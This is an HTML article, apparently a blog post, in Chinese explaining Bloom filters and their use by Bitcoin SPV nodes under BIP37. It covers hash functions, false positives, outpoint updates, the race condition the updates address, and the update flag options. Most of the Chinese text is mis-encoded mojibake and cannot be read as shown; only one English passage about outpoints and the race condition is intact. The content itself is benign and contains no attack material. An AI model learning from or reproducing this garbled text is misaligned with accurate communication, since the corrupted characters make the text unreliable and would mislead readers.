<p>å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆBloom Filterï¼‰æ˜¯1970å¹´ç”±å¸ƒéš†æå‡ºçš„ï¼Œç”¨æ¥åˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦åœ¨é›†åˆå†…ï¼Œå®ƒå…·æœ‰è¿è¡Œé€Ÿåº¦å¿«ï¼ˆæ—¶é—´æ•ˆç‡ï¼‰ï¼Œå ç”¨å†…å­˜å°çš„ä¼˜ç‚¹ï¼ˆç©ºé—´æ•ˆç‡ï¼‰ï¼Œä½†æ˜¯æœ‰ä¸€å®šçš„è¯¯è¯†åˆ«ç‡å’Œåˆ é™¤å›°éš¾çš„é—®é¢˜ã€‚å®ƒèƒ½å¤Ÿåˆ¤æ–­æŸä¸ªå…ƒç´ ä¸€å®šä¸åœ¨é›†åˆå†…æˆ–å¯èƒ½åœ¨é›†åˆå†…ï¼Œä¹Ÿå³Bloom Filterä¼šé€ æˆä¸€å®šçš„False Positiveï¼Œä½†æ˜¯ä¸ä¼šé€ æˆFalse Negativeã€‚</p>
<p>Bloomè¿‡æ»¤å™¨çš„å®ç°æ˜¯ç”±ä¸€ä¸ªå¯å˜é•¿åº¦ï¼ˆNï¼‰çš„äºŒè¿›åˆ¶æ•°ç»„ï¼ˆNä½äºŒè¿›åˆ¶æ•°æ„æˆä¸€ä¸ªä½åŸŸï¼‰å’Œæ•°é‡å¯å˜ï¼ˆMï¼‰çš„ä¸€ç»„å“ˆå¸Œå‡½æ•°ç»„æˆã€‚è¿™äº›å“ˆå¸Œå‡½æ•°çš„è¾“å‡ºå€¼å§‹ç»ˆåœ¨1å’ŒNä¹‹é—´ï¼Œå¹¶ä¸”è¯¥å‡½æ•°ä¸ºç¡®å®šæ€§å‡½æ•°ï¼Œä¹Ÿå³å¯¹ç‰¹å®šè¾“å…¥æ€»æ˜¯å¾—åˆ°åŒä¸€ä¸ªçš„ç»“æœã€‚Bloomè¿‡æ»¤å™¨çš„å‡†ç¡®æ€§å’Œç§å¯†æ€§èƒ½é€šè¿‡æ”¹å˜é•¿åº¦ï¼ˆNï¼‰å’Œå“ˆå¸Œå‡½æ•°çš„æ•°é‡ï¼ˆMï¼‰æ¥è°ƒèŠ‚ã€‚</p>
<p>ä¸å…¶å®ƒæ•°æ®ç»“æ„ç›¸æ¯”è¾ƒï¼ŒBloom filterçš„ä¼˜ç‚¹åŒ…æ‹¬ï¼šç©ºé—´æ•ˆç‡å’ŒæŸ¥æ‰¾æ—¶é—´å¤æ‚æ€§ï¼›ä¸éœ€è¦å­˜å‚¨å…ƒç´ æœ¬èº«ï¼Œåœ¨ä¿æŠ¤éšç§æ–¹é¢å…·æœ‰ä¼˜åŠ¿ã€‚</p>
<p>ä¸‹é¢é€šè¿‡ä¸€äº›ä¾‹å­æ¥å…·ä½“è§£é‡ŠBloom Filterçš„å·¥ä½œåŸç†ã€‚</p>
<p>è¿™é‡Œä½¿ç”¨åå…­ä½æ•°ç»„ï¼ˆN&#x3D;16ï¼‰å’Œä¸‰ä¸ªå“ˆå¸Œå‡½æ•°ï¼ˆM&#x3D;3ï¼‰æ¥æ¼”ç¤ºBloomè¿‡æ»¤å™¨çš„åº”ç”¨åŸç†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233044.jpg" alt="img"></p>
<p align="center">ç”±16ä½æ•°ç»„å’Œ3ä¸ªå“ˆå¸Œå‡½æ•°ç»„æˆçš„ç®€æ˜“Bloom Filter</p>

<p>Bloomè¿‡æ»¤å™¨æ•°ç»„é‡Œçš„æ¯ä¸€ä¸ªæ•°çš„åˆå§‹å€¼ä¸ºé›¶ã€‚å…³é”®è¯è¢«åŠ åˆ°Bloomè¿‡æ»¤å™¨ä¸­ä¹‹å‰ï¼Œä¼šä¾æ¬¡é€šè¿‡æ¯ä¸€ä¸ªå“ˆå¸Œå‡½æ•°è¿ç®—ä¸€æ¬¡ã€‚è¯¥è¾“å…¥ç»ç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°è¿ç®—åå¾—åˆ°äº†ä¸€ä¸ªåœ¨1å’ŒNä¹‹é—´çš„æ•°ï¼Œå®ƒåœ¨è¯¥æ•°ç»„ï¼ˆç¼–å·ä¾æ¬¡ä¸º1è‡³Nï¼‰ä¸­æ‰€å¯¹åº”çš„ä½è¢«ç½®ä¸º1ï¼Œä»è€ŒæŠŠå“ˆå¸Œå‡½æ•°çš„è¾“å‡ºè®°å½•ä¸‹æ¥ã€‚æ¥ç€å†è¿›è¡Œä¸‹ä¸€ä¸ªå“ˆå¸Œå‡½æ•°çš„è¿ç®—ï¼ŒæŠŠå¦å¤–ä¸€ä½ç½®ä¸º1ï¼›ä»¥æ­¤ç±»æ¨ã€‚å½“å…¨éƒ¨Mä¸ªå“ˆå¸Œå‡½æ•°éƒ½è¿ç®—è¿‡ä¹‹åï¼Œä¸€å…±æœ‰Mä¸ªä½çš„å€¼ä»0å˜æˆäº†1ï¼Œè¿™ä¸ªå…³é”®è¯ä¹Ÿè¢«â€œè®°å½•â€åœ¨äº†Bloomè¿‡æ»¤å™¨é‡Œã€‚</p>
<p>å‘ä¸Šå›¾ä¸­çš„ç®€æ˜“Bloomè¿‡æ»¤å™¨æ·»åŠ å…³é”®è¯â€œAâ€ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233045.jpg" alt="img"></p>
<p align="center">å‘ç®€æ˜“Bloomè¿‡æ»¤å™¨ä¸­å¢åŠ å…³é”®è¯â€œAâ€</p>

<p>å¢åŠ ç¬¬äºŒä¸ªå…³é”®è¯å°±æ˜¯ç®€å•åœ°é‡å¤ä¹‹å‰çš„æ­¥éª¤ã€‚å…³é”®è¯ä¾æ¬¡é€šè¿‡å„ä¸ªå“ˆå¸Œå‡½æ•°è¿ç®—ä¹‹åï¼Œç›¸åº”çš„ä½å˜ä¸º1ï¼ŒBloomè¿‡æ»¤å™¨åˆ™è®°å½•ä¸‹è¯¥å…³é”®è¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“Bloomè¿‡æ»¤å™¨é‡Œçš„å…³é”®è¯å¢åŠ æ—¶ï¼Œå®ƒå¯¹åº”çš„æŸä¸ªå“ˆå¸Œå‡½æ•°çš„è¾“å‡ºå€¼çš„ä½å¯èƒ½å·²ç»æ˜¯1äº†ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œè¯¥ä½ä¸ä¼šå†æ¬¡æ”¹å˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œéšç€æ›´å¤šçš„å…³é”®è¯æŒ‡å‘äº†é‡å¤çš„ä½ï¼ŒBloomè¿‡æ»¤å™¨éšç€ä½1çš„å¢åŠ è€Œé¥±å’Œï¼Œå‡†ç¡®æ€§ä¹Ÿå› æ­¤é™ä½äº†ã€‚è¯¥è¿‡æ»¤å™¨ä¹‹æ‰€ä»¥æ˜¯åŸºäºæ¦‚ç‡çš„æ•°æ®ç»“æ„ï¼Œå°±æ˜¯å› ä¸ºå…³é”®è¯çš„å¢åŠ ä¼šå¯¼è‡´å‡†ç¡®æ€§çš„é™ä½ã€‚å‡†ç¡®æ€§å–å†³äºå…³é”®å­—çš„æ•°é‡ä»¥åŠæ•°ç»„å¤§å°ï¼ˆNï¼‰å’Œå“ˆå¸Œå‡½æ•°çš„å¤šå°‘ï¼ˆMï¼‰ã€‚æ›´å¤§çš„æ•°ç»„å’Œæ›´å¤šçš„å“ˆå¸Œå‡½æ•°ä¼šè®°å½•æ›´å¤šçš„ å…³é”®è¯ä»¥æé«˜å‡†ç¡®æ€§ã€‚è€Œå°çš„æ•°ç»„åŠæœ‰é™çš„å“ˆå¸Œå‡½æ•°åªèƒ½è®°å½•æœ‰é™çš„å…³é”®è¯ä»è€Œé™ä½å‡†ç¡®æ€§ã€‚</p>
<p>ã€æ›´å¤§çš„æ•°ç»„å¯ä»¥æé«˜å‡†ç¡®æ€§å¾ˆå¥½ç†è§£ï¼Œå› ä¸ºå¯ä»¥é™ä½å†²çªï¼›å¦‚ä½•ç†è§£éœ€è¦æ›´å¤šå“ˆå¸Œå‡½æ•°å‘¢ï¼Ÿè¿™é‡Œä¸»è¦æ˜¯è€ƒè™‘åˆ°æ•°ç»„çš„å¤§å°ä¸€èˆ¬è€Œè¨€æ˜¯æ¯”è¾ƒæœ‰é™çš„ï¼Œå› æ­¤åœ¨å•ä¸ªå“ˆå¸Œå‡½æ•°çš„æ—¶å€™ï¼Œå†²çªæ˜¯ä¸å¯é¿å…çš„ï¼›ä½†æ˜¯å¤šä¸ªå“ˆå¸Œå‡½æ•°åŒæ—¶å‘ç”Ÿç¢°æ’çš„å¯èƒ½æ€§å°±æ¯”è¾ƒå°ã€‚è­¬å¦‚æœ‰ä¸€ä¸ªå…³é”®å­—â€abcâ€è¢«åŠ å…¥è¿›æ¥ï¼Œåªæœ‰åªæœ‰ä¸€ä¸ªå“ˆå¸Œå‡½æ•°ï¼Œæœ‰å¯èƒ½â€œxyzâ€ä¼šå’Œâ€abcâ€å‘ç”Ÿç¢°æ’ï¼Œæ­¤æ—¶ä¸èƒ½åˆ¤æ–­â€xyzâ€æ˜¯ä¸æ˜¯å…³é”®å­—ã€‚ä½†æ˜¯å¦‚æœæœ‰ä¸‰ä¸ªå“ˆå¸Œå‡½æ•°ï¼Œâ€œxyzâ€å’Œâ€abcâ€åœ¨ä¸‰ä¸ªå“ˆå¸Œå‡½æ•°ä¸­éƒ½ç¢°æ’çš„æ¦‚ç‡å°±æ¯”è¾ƒå°ã€‚ã€‘</p>
<p>é—®é¢˜ï¼šå¦‚æœNæ¯”è¾ƒå°ï¼Œå½“æ·»åŠ å…³é”®è¯æ—¶ï¼Œæ‰€æœ‰çš„ä½éƒ½æˆä¸º1ï¼Œæ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233046.jpg" alt="img">å‘Bloom Filterå¢åŠ å…³é”®è¯</p>
<p>ä¸ºæµ‹è¯•æŸä¸€å…³é”®è¯æ˜¯å¦è¢«è®°å½•åœ¨æŸä¸ªBloomè¿‡æ»¤å™¨ä¸­ï¼Œåˆ™å°†è¯¥å…³é”®è¯é€ä¸€ä»£å…¥å„å“ˆå¸Œå‡½æ•°ä¸­è¿ç®—ï¼Œå¹¶å°†æ‰€å¾—çš„ç»“æœä¸åŸæ•°ç»„è¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœæ‰€æœ‰çš„ç»“æœå¯¹åº”çš„ä½éƒ½å˜ä¸ºäº†1ï¼Œåˆ™è¡¨ç¤ºè¿™ä¸ªå…³é”®è¯æœ‰å¯èƒ½å·²è¢«è¯¥è¿‡æ»¤å™¨è®°å½•ã€‚ä¹‹æ‰€ä»¥è¿™ä¸€ç»“è®ºå¹¶ä¸ç¡®å®šï¼Œæ˜¯å› ä¸ºè¿™äº›å­—èŠ‚1ä¹Ÿæœ‰å¯èƒ½æ˜¯å…¶ä»–å…³é”®è¯è¿ç®—çš„é‡å ç»“æœã€‚ç®€å•æ¥è¯´ï¼ŒBloomè¿‡æ»¤å™¨æ­£åŒ¹é…ä»£è¡¨ç€â€œå¯èƒ½æ˜¯â€ã€‚</p>
<p>ä¸‹å›¾æ˜¯ä¸€ä¸ªéªŒè¯å…³é”®è¯â€œXâ€æ˜¯å¦åœ¨å‰è¿°Bloomè¿‡æ»¤å™¨ä¸­çš„ä¾‹å­ã€‚ç›¸åº”çš„æ¯”ç‰¹ä½éƒ½è¢«ç½®ä¸º1ï¼Œæ‰€ä»¥è¿™ä¸ªå…³é”®è¯å¾ˆæœ‰å¯èƒ½æ˜¯åŒ¹é…çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233047.jpg" alt="img"></p>
<p>æµ‹è¯•å…³é”®è¯â€œXâ€œæ˜¯å¦èƒ½é€šè¿‡Bloom Filter</p>
<p>å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæˆ‘ä»¬ä»£å…¥å…³é”®è¯è®¡ç®—åçš„ç»“æœæŸä½ä¸º0ï¼Œè¯´æ˜è¯¥å…³é”®è¯å¹¶æ²¡æœ‰è¢«è®°å½•åœ¨è¿‡æ»¤å™¨é‡Œã€‚è´ŸåŒ¹é…çš„ç»“æœä¸æ˜¯å¯èƒ½ï¼Œè€Œæ˜¯ä¸€å®šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè´ŸåŒ¹é…ä»£è¡¨ç€â€œä¸€å®šä¸æ˜¯â€ã€‚</p>
<p>ä¸‹å›¾éªŒè¯å…³é”®è¯â€œYâ€æ˜¯å¦å­˜åœ¨äºç®€æ˜“Bloomè¿‡æ»¤å™¨ä¸­çš„å›¾ä¾‹ã€‚å›¾ä¸­æŸä¸ªç»“æœå­—æ®µä¸º0ï¼Œè¯¥å­—æ®µä¸€å®šæ²¡æœ‰è¢«åŒ¹é…ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233048.jpg" alt="img"></p>
<p>é€šè¿‡ä½¿ç”¨Bloom Filterï¼Œä½¿å¾—SPVèŠ‚ç‚¹åªæ¥æ”¶äº¤æ˜“ä¿¡æ¯çš„å­é›†ï¼ŒåŒæ—¶ä¸ä¼šæ³„éœ²å“ªäº›æ˜¯å®ƒä»¬æ„Ÿå…´è¶£çš„åœ°å€ã€‚å®é™…ä¸Šï¼Œå†å¯¹Bloom Filterè¿›è¡Œè®¾ç½®æ—¶ï¼Œå¦‚æœå¸¦å®½å’Œç¡¬ä»¶æ¡ä»¶å®½è£•ï¼ŒSPVèŠ‚ç‚¹å¯ä»¥é€‰æ‹©å…·æœ‰é«˜FPï¼ˆfalse positiveï¼‰ç‡çš„Bloom Filterï¼Œæ­¤æ—¶å¦‚æœæœ‰ç¬¬ä¸‰æ–¹å¯¹SPVè¿›è¡Œè·Ÿè¸ªï¼Œçœ‹åˆ°çš„å°†æ˜¯å¤§é‡çš„æ•°æ®ä¸­æ··æ‚ç€ä¸èŠ‚ç‚¹ç›¸å…³çš„æ•°æ®ï¼Œä»è€Œéšç§æ€§å¾—åˆ°äº†ä¿æŠ¤ã€‚ç›¸åï¼Œå¦‚æœå¸¦å®½å’Œç¡¬ä»¶æ¡ä»¶ä¸å®½è£•ï¼Œåˆ™å¯ä»¥é€‰æ‹©å°½å¯èƒ½ç²¾ç¡®çš„è®¾ç½®ä»è€Œè¿‡æ»¤æ‰ä¸ç›¸å…³çš„æ•°æ®ï¼Œä½†æ˜¯ç¬¬ä¸‰æ–¹å°±æœ‰å¯èƒ½å°†äº¤æ˜“å’ŒIPåœ°å€å…³è”èµ·æ¥ã€‚</p>
<p><strong>å·¥ä½œè¿‡ç¨‹</strong></p>
<p>é¦–å…ˆï¼ŒSPVèŠ‚ç‚¹ä¼šåˆå§‹åŒ–ä¸€ä¸ªä¸ä¼šåŒ¹é…ä»»ä½•å…³é”®è¯çš„â€œç©ºç™½â€Bloomè¿‡æ»¤å™¨ã€‚æ¥ä¸‹æ¥ï¼ŒSPVèŠ‚ç‚¹ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«é’±åŒ…ä¸­æ‰€æœ‰åœ°å€ä¿¡æ¯çš„åˆ—è¡¨ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªä¸æ¯ä¸ªåœ°å€ç›¸å¯¹åº”çš„äº¤æ˜“è¾“å‡ºç›¸åŒ¹é…çš„æœç´¢æ¨¡å¼ã€‚é€šå¸¸ï¼Œè¿™ç§æœç´¢æ¨¡å¼æ˜¯ä¸€ä¸ªå‘å…¬é’¥ä»˜æ¬¾çš„å“ˆå¸Œè„šæœ¬ï¼Œè¯¥è„šæœ¬æ˜¯ä¸€ä¸ªä¼šå‡ºç°åœ¨æ¯ä¸€ä¸ªå‘å…¬é’¥å“ˆå¸Œåœ°å€ï¼ˆP2PKHï¼‰ä»˜æ¬¾çš„äº¤æ˜“ä¸­çš„é”å®šè„šæœ¬ã€‚å¦‚æœSPVèŠ‚ç‚¹éœ€è¦è¿½è¸ªP2SHåœ°å€ä½™é¢ï¼Œæœç´¢æ¨¡å¼å°±ä¼šå˜æˆP2SHè„šæœ¬ã€‚ç„¶åï¼ŒSPVèŠ‚ç‚¹ä¼šæŠŠæ¯ä¸€ä¸ªæœç´¢æ¨¡å¼æ·»åŠ è‡³Bloomè¿‡æ»¤å™¨é‡Œï¼Œè¿™æ ·åªè¦å…³é”®è¯å‡ºç°åœ¨äº¤æ˜“ä¸­å°±èƒ½å¤Ÿè¢«è¿‡æ»¤å™¨è¯†åˆ«å‡ºæ¥ã€‚æœ€åï¼Œå¯¹ç­‰èŠ‚ç‚¹ä¼šç”¨æ”¶åˆ°çš„Bloomè¿‡æ»¤å™¨æ¥åŒ¹é…ä¼ é€è‡³SPVèŠ‚ç‚¹çš„äº¤æ˜“ã€‚</p>
<p><strong>ç”¨æ¥filterçš„æ•°æ®å¯ä»¥æ˜¯tx.hash,ä¹Ÿå¯ä»¥æ˜¯txout.scriptPubKeyä¸­çš„dataï¼Œä¹Ÿå¯ä»¥æ˜¯txin.scriptSigä¸­çš„data</strong> </p>
<p>FilteråŒ¹é…ç®—æ³•</p>
<p>Bloom filterå¯ä»¥ç”¨äºæµ‹è¯•ä»»ä½•çš„æ•°æ®ï¼ŒæŸ¥çœ‹æ•°æ®æ˜¯å¦ä¸ç”¨æˆ·åŠ å…¥filterä¸­çš„æ•°æ®ç›¸å…³ã€‚</p>
<p>åœ¨BIP37ä¸­ï¼Œç¡®å®šäº¤æ˜“æ˜¯å¦åŒ¹é…filterï¼Œä½¿ç”¨ä»¥ä¸‹ç®—æ³•ï¼Œä¸€æ—¦å‘ç°äº†åŒ¹é…ï¼Œåˆ™ç®—æ³•åœæ­¢ã€‚</p>
<ol>
<li>æµ‹è¯•äº¤æ˜“æœ¬èº«çš„å“ˆå¸Œã€‚</li>
<li>å¯¹äºæ¯ä¸ªè¾“å‡ºï¼Œæµ‹è¯•è¾“å‡ºè„šæœ¬ä¸­çš„æ¯ä¸€ä¸ªæ•°æ®é¡¹ã€‚æ¯ä¸€ä¸ªå“ˆå¸Œï¼ˆå¯†é’¥ï¼‰éƒ½å•ç‹¬æµ‹è¯•ã€‚å¦‚æœåœ¨æµ‹è¯•äº¤æ˜“çš„æ—¶å€™å‘ç°äº†åŒ¹é…çš„è¾“å‡ºï¼Œé‚£ä¹ˆèŠ‚ç‚¹ä¹Ÿå¯ä»¥å‡çº§filterï¼Œå°†è¯¥è¾“å‡ºçš„COutPointç»“æ„ä¹Ÿæ·»åŠ åˆ°filterä¸­ã€‚ä¹Ÿå³ï¼Œå°†è¯¥äº¤æ˜“çš„è¾“å‡ºä¸­ä¸SPVç”¨æˆ·è‡ªå·±ç›¸å…³çš„éƒ¨åˆ†ï¼ˆå¯ç”¨äºå…¶ä»–äº¤æ˜“çš„è¾“å…¥ï¼‰æ·»åŠ åˆ°filterä¸­ã€‚</li>
<li>å¯¹äºæ¯ä¸€ä¸ªè¾“å…¥ï¼Œæµ‹è¯•COutPointç»“æ„ã€‚</li>
<li>å¯¹äºæ¯ä¸€ä¸ªè¾“å…¥ï¼Œæµ‹è¯•è¾“å…¥è„šæœ¬ScriptSigçš„æ¯ä¸€ä¸ªæ•°æ®é¡¹ã€‚</li>
<li>å¦åˆ™ï¼Œæ²¡æœ‰åŒ¹é…ã€‚</li>
</ol>
<p>æ¥åˆ†æä¸€ä¸‹ï¼š</p>
<ol>
<li>æ­¥éª¤1æ˜¯å› ä¸ºç”¨æˆ·æœ‰å¯èƒ½å¯¹æŸä¸€ä¸ªç‰¹å®šçš„äº¤æ˜“æ„Ÿå…´è¶£ï¼›</li>
<li>æ­¥éª¤2æ˜¯å› ä¸ºç”¨æˆ·å¯èƒ½åœ¨è¿‡æ»¤å™¨ä¸­åŠ å…¥äº†è‡ªå·±çš„å…¬é’¥æˆ–åœ°å€ï¼›å¦‚æœæŸä¸€ç¬”äº¤æ˜“å‘é’±ç»™è‡ªå·±ï¼Œé‚£ä¹ˆç”¨è¯¥COutpointæ¥æ›´æ–°è¿‡æ»¤å™¨ï¼›ã€æ£€æŸ¥è‡ªå·±çš„æ”¶å…¥ã€‘</li>
<li>æ­¥éª¤3æ£€æŸ¥è‡ªå·±çš„èŠ±è´¹ï¼›</li>
<li>æ­¥éª¤4æ£€æŸ¥è‡ªå·±çš„èŠ±è´¹ï¼›</li>
</ol>
<p>é—®é¢˜ï¼šå“ªäº›æ•°æ®åº”è¯¥åŠ å…¥åˆ°filterä¸­å‘¢ï¼Ÿ</p>
<p>åœ¨ä¸Šé¢çš„ç®—æ³•ä¸­ï¼Œåœ¨step 2ä¸­æåˆ°â€œåŒ¹é…çš„è¾“å‡ºï¼Œé‚£ä¹ˆèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ›´æ–°filterï¼Œå°†è¯¥è¾“å‡ºçš„COutPointç»“æ„ä¹Ÿæ·»åŠ åˆ°filterä¸­â€ã€‚ä¸ºä»€ä¹ˆè¦å¯¹filterè¿›è¡ŒåŠæ—¶çš„æ›´æ–°å‘¢ï¼Ÿ</p>
<p>ä¸ºå•¥è¦åŠ å…¥coutpointï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç†è§£coutpointæ˜¯åŒ…æ‹¬äº†(txidï¼Œcoutputid)çš„ä¸€ä¸ªæ•°æ®ç»“æ„ã€‚</p>
<p>The test for outpoints is there to ensure you can find transactions spending outputs in your wallet, even though you donâ€™t know anything about their form. As you can see, once set on a connection the filter is <strong>not static</strong> and can change throughout the connections lifetime. This is done to avoid the following race condition:</p>
<p>A client sets a filter matching a key in their wallet. They then start downloading the block chain. The part of the chain that the client is missing is requested using getblocks.</p>
<ol>
<li>The first block is read from disk by the serving peer. It contains TX 1 which sends money to the clients key. It matches the filter and is thus sent to the client.</li>
<li>The second block is read from disk by the serving peer. It contains TX 2 which spends TX 1. However TX 2 does not contain any of the clients keys and is thus not sent. The client does not know the money they received was already spent.</li>
</ol>
<p>å¯¹outpointsçš„æµ‹è¯•æ˜¯ä¸ºäº†ç¡®ä¿èƒ½æ‰¾åˆ°èŠ±è´¹é’±åŒ…ä¸­çš„è¾“å‡ºçš„äº¤æ˜“ï¼Œå³ä½¿ä½ å¯¹å®ƒä»¬çš„å½¢å¼ä¸€æ— æ‰€çŸ¥ã€‚æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œä¸€æ—¦åœ¨è¿æ¥ä¸Šè®¾ç½®äº†è¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨å°±ä¸æ˜¯é™æ€çš„ï¼Œå®ƒå¯ä»¥åœ¨æ•´ä¸ªè¿æ¥çš„ç”Ÿå‘½å‘¨æœŸå†…æ”¹å˜ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†é¿å…å‡ºç°ä¸‹é¢çš„race conditionã€‚</p>
<p>å®¢æˆ·ç«¯è®¾ç½®äº†ä¸é’±åŒ…ä¸­çš„å¯†é’¥ï¼ˆå…¬é’¥ã€åœ°å€ï¼‰ç›¸åŒ¹é…çš„è¿‡æ»¤å™¨ã€‚ç„¶åä»–ä»¬å¼€å§‹ä¸‹è½½åŒºå—é“¾ã€‚å®¢æˆ·ç«¯ç¼ºå°‘çš„é‚£éƒ¨åˆ†åŒºå—é“¾æ˜¯ä½¿ç”¨getblocksè¯·æ±‚çš„ã€‚</p>
<ul>
<li>ç¬¬ä¸€ä¸ªåŒºå—æ˜¯ç”±æœåŠ¡èŠ‚ç‚¹ä»ç£ç›˜ä¸Šè¯»å–çš„ã€‚å®ƒåŒ…å«TX 1ï¼ŒTX1å‘å®¢æˆ·çš„å¯†é’¥ï¼ˆå…¬é’¥ã€åœ°å€ï¼‰å‘é€èµ„é‡‘ã€‚å®ƒä¸è¿‡æ»¤å™¨ç›¸åŒ¹é…ï¼Œå› æ­¤è¢«å‘é€åˆ°å®¢æˆ·ç«¯ã€‚</li>
<li>ç¬¬äºŒä¸ªå—æ˜¯ç”±æœåŠ¡èŠ‚ç‚¹ä»ç£ç›˜ä¸Šè¯»å–çš„ã€‚å®ƒåŒ…å«TX 2ï¼Œå®ƒèŠ±è´¹äº†TX 1ã€‚ç„¶è€ŒTX 2ä¸åŒ…å«ä»»ä½•å®¢æˆ·çš„å¯†é’¥ï¼ˆå…¬é’¥ã€åœ°å€ï¼‰ï¼Œå› æ­¤æ²¡æœ‰è¢«å‘é€ã€‚å®¢æˆ·ç«¯ä¸çŸ¥é“ä»–ä»¬æ”¶åˆ°çš„é’±å·²ç»è¢«èŠ±æ‰äº†ã€‚</li>
</ul>
<p>BIP 37åœ¨å®ç°æ—¶ï¼Œæä¾›äº†Bloom_update_noneé€‰é¡¹ï¼Œä¹Ÿå³ä¸æ›´æ–°ã€‚ä¸»è¦æ˜¯å› ä¸ºï¼Œéšç€åŠ å…¥é¡¹çš„å¢å¤šï¼ŒBloom Filterçš„æ•ˆç‡ä¼šå˜ä½ã€‚ç”¨æˆ·å¯èƒ½éœ€è¦å®šæ—¶åˆ·æ–°filterã€‚</p>
<p>å¦å¤–æä¾›äº†Bloom_update_allé€‰é¡¹ï¼Œä¹Ÿå³ä¸Šæ–‡æåˆ°çš„å°†è¾“å‡ºä¸­çš„scriptpbkä¸­çš„outpointéƒ½åŠ å…¥è¿›æ¥ï¼›</p>
<p>å¦å¤–ï¼Œè¿˜æä¾›äº†Bloom_update_P2PUBKEY_ONLYé€‰é¡¹ï¼Œä¹Ÿå³ä»…åœ¨è¾“å‡ºè„šæœ¬æ˜¯ pay-to-pubkeyæˆ–è€…æ˜¯pay to multisigå½¢å¼çš„æ—¶å€™æ‰å°†outpointæ·»åŠ åˆ°filterä¸­ã€‚</p>
<p>æ€è€ƒï¼šä¸ºä»€ä¹ˆæœ‰Bloom_update_P2PUBKEY_ONLYé€‰é¡¹ï¼Ÿ</p>
<p>ã€åœ¨P2PKHç±»å‹çš„äº¤æ˜“ä¸­ï¼Œå¦‚æœè¦èŠ±è´¹ï¼Œåˆ™åœ¨scriptsigä¸­ä¸€å®šä¼šæœ‰ç”¨æˆ·çš„å…¬é’¥æä¾›ï¼Œæ‰€ä»¥ç”¨æˆ·å¯ä»¥é€šè¿‡åœ¨filterä¸­æ·»åŠ è‡ªå·±çš„å…¬é’¥æ¥æŸ¥è¯¢ï¼›ä»è€Œé˜²æ­¢filteræ€§èƒ½å¿«é€Ÿä¸‹é™ã€‘</p>
<p>é—®é¢˜ï¼šèƒ½ä¸èƒ½é€šè¿‡åˆ é™¤é¡¹æ¥æ›´æ–°bloom filter?</p>
<p>å­—ç¬¦ä¸²åŠ å…¥äº†å°±è¢«ä¸èƒ½åˆ é™¤äº†ï¼Œå› ä¸ºåˆ é™¤ä¼šå½±å“åˆ°å…¶ä»–å­—ç¬¦ä¸²ã€‚å®åœ¨éœ€è¦åˆ é™¤å­—ç¬¦ä¸²çš„å¯ä»¥ä½¿ç”¨Counting bloomfilter(CBF)ï¼Œè¿™æ˜¯ä¸€ç§åŸºæœ¬Bloom Filterçš„å˜ä½“ï¼ŒCBFå°†åŸºæœ¬Bloom Filteræ¯ä¸€ä¸ªBitæ”¹ä¸ºä¸€ä¸ªè®¡æ•°å™¨ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°åˆ é™¤å­—ç¬¦ä¸²çš„åŠŸèƒ½äº†ã€‚</p>
<p>ã€€ã€€Bloom Filterè·Ÿå•å“ˆå¸Œå‡½æ•°Bit-Mapä¸åŒä¹‹å¤„åœ¨äºï¼šBloom Filterä½¿ç”¨äº†kä¸ªå“ˆå¸Œå‡½æ•°ï¼Œæ¯ä¸ªå­—ç¬¦ä¸²è·Ÿkä¸ªbitå¯¹åº”ã€‚ä»è€Œé™ä½äº†å†²çªçš„æ¦‚ç‡ã€‚</p>
<p>æœ€åï¼Œåˆ†æä¸€ä¸‹Bloom Filterçš„æ•ˆç‡å’Œå†…å®¹å ç”¨æƒ…å†µï¼Œä¸ºä½•è¯´å®ƒé€Ÿåº¦å¿«ï¼Œå ç”¨å†…å­˜å°ã€‚</p>
<p>Bloom filterè¢«å¹¿æ³›åº”ç”¨äºå„ç§é¢†åŸŸï¼Œæ¯”å¦‚æ‹¼å†™æ£€æŸ¥ã€å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•ã€ç½‘ç»œåŒ…åˆ†æå·¥å…·ã€Web Cacheã€æ–‡ä»¶ç³»ç»Ÿã€å­˜å‚¨ç³»ç»Ÿç­‰ã€‚</p>
